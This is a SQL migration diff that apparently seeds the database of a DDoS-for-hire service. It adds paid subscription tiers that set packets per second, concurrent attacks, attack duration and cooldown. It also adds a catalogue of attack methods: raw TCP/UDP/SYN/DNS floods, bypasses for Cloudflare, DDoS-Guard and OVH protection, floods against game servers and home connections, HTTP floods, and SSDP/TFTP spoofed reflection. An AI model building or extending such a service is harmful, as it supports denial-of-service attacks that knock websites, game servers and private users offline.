@@ -86,3 +86,48 @@ CREATE TABLE IF NOT EXISTS `api_method_groups` (
 	`name` varchar(255),
 	PRIMARY KEY( `group_id` )
 );
+
+ALTER TABLE api_sublist ADD name VARCHAR(255);
+ALTER TABLE api_methods_all RENAME COLUMN max_bots TO max_pps;
+
+ALTER TABLE api_methods_all MODIFY COLUMN sub_id int;
+ALTER TABLE api_methods_all MODIFY COLUMN max_time int;
+
+insert into api_sublist (max_pps,concurrent,max_time,cooldown,name) values (50000, 1, 600, 120, 'vip');
+insert into api_sublist (max_pps,concurrent,max_time,cooldown,name) values (150000, 2, 600, 120, 'vip+');
+insert into api_sublist (max_pps,concurrent,max_time,cooldown,name) values (250000, 2, 1200, 120, 'premium');
+insert into api_sublist (max_pps,concurrent,max_time,cooldown,name) values (350000, 3, 3600, 90, 'premium+');
+insert into api_sublist (max_pps,concurrent,max_time,cooldown,name) values (500000, 5, 5400, 60, 'founder');
+
+insert into api_method_groups (name) values ('amp');
+insert into api_method_groups (name) values ('raw');
+insert into api_method_groups (name) values ('home');
+insert into api_method_groups (name) values ('gaming');
+insert into api_method_groups (name) values ('bypass');
+insert into api_method_groups (name) values ('spoofed');
+insert into api_method_groups (name) values ('normal');
+
+insert into api_methods_all values (1, 'tcp','raw tcp flood',4, 600, 2);
+insert into api_methods_all values (2, 'udp','raw udp flood',4, 600, 2);
+insert into api_methods_all values (3, 'syn','raw syn flood',4, 600, 2);
+insert into api_methods_all values (4, 'dns','raw dns flood',4, 600, 2);
+insert into api_methods_all values (5, 'rand','udp rand (raw)',2, 0, 2);
+insert into api_methods_all values (6, 'ddosguard','ddos guard bypass',3, 600, 5);
+insert into api_methods_all values (7, 'cloudflare','cloudflare bypass',3, 600, 5);
+insert into api_methods_all values (8, 'ovhdoom','ovh bypass',3,60, 5);
+insert into api_methods_all values (9, 'hydra','hydra bypass',2,60, 5);
+insert into api_methods_all values (10, 'udpkill','udp bypass',2,60, 5);
+insert into api_methods_all values (11, 'fortnite','fortnite server',2,0, 4);
+insert into api_methods_all values (12, '2k','2k server', 2, 0, 4);
+insert into api_methods_all values (13, 'ranked','ranked server', 2, 0, 4);
+insert into api_methods_all values (14, 'r6','r6 server', 1, 0, 4);
+insert into api_methods_all values (15, 'httpget','http get', 1, 0, 7);
+insert into api_methods_all values (16, 'httphead','http head', 1, 0, 7);
+insert into api_methods_all values (17, 'httphex','http get	random hex', 1, 0, 7);
+insert into api_methods_all values (18, 'httppost','http post', 1, 0, 7);
+insert into api_methods_all values (19, 'ssdp','ssdp spoof', 2, 600, 6);
+insert into api_methods_all values (20, 'tftp','tftp spoof', 2, 600, 6);
+insert into api_methods_all values (21, 'tamp','tamp reflection', 4, 120, 1);
+insert into api_methods_all values (22, 'xamp','xamp reflection', 4, 120, 1);
+insert into api_methods_all values (23, 'hold','home holder', 2, 84600, 3);
+insert into api_methods_all values (24, 'home','simple home flood', 1, 3600, 3);
